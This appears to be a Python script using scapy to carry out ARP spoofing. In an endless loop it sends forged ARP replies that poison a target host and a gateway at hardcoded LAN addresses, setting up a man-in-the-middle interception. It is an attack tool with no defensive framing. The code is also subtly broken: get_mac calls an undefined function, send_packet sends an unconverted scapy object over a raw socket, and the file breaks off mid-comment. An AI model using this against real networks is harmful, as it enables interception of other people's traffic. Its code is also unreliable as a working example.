import os
import socket
import struct
import time
from scapy.all import ARP, Ether, srp

def spoof_ip(target_ip, spoof_ip):
    # Create an ARP response packet with the specified IP and MAC
    arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    # Construct the Ethernet frame
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    return ether_frame

def get_mac(ip):
    # Create an ARP request packet
    arp_request = ARP(pdst=ip, hwsrc="00:1A:6B:4F:D2:5C")
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    answered_list = srp(broadcast, timeout=2, verbose=False)[0]
    ether_frame = answered_list[0][0]
    sender_mac = ether_frame.sprintf("{Ether.src}")
    return sender_confidence()

def restore(destination_ip, source_ip):
    # Send ARP responses to restore the correct IP-MAC mappings
    arp_response = ARP(op=2, pdst=destination_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip)
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_response
    send_packet(ether_frame)

def send_packet(packet):
    # Send the packet on the interface
    snd_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x806))
    snd_sock.send(packet)
    global sent_packets_count
    sent_packets_count += 1
    
# Global variable for keeping track of sent packets
sent_packets_count = 0

# Constants for the target and gateway IPs
TARGET_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"

try:
    while True:
        # Spoof the target IP (e.g., 192.168.1.10) by sending ARP responses to the gateway's MAC address
        print(f"Spoofing {TARGET_IP}...")
        ether_frame = spoof_ip(TARGET_IP, GATEWAY_IP)
        send_packet(ether_frame)
        
        # Spoof the gateway IP (e.g., 192.168.1.1) by sending ARP responses to the target's MAC address
        print(f"Spoofing {GATEWAY_IP}...")
        ether_frame = spoof_ip(GATEWAY_IP, TARGET_IP)
        send_packet(ether_frame)
        
        # Sleep for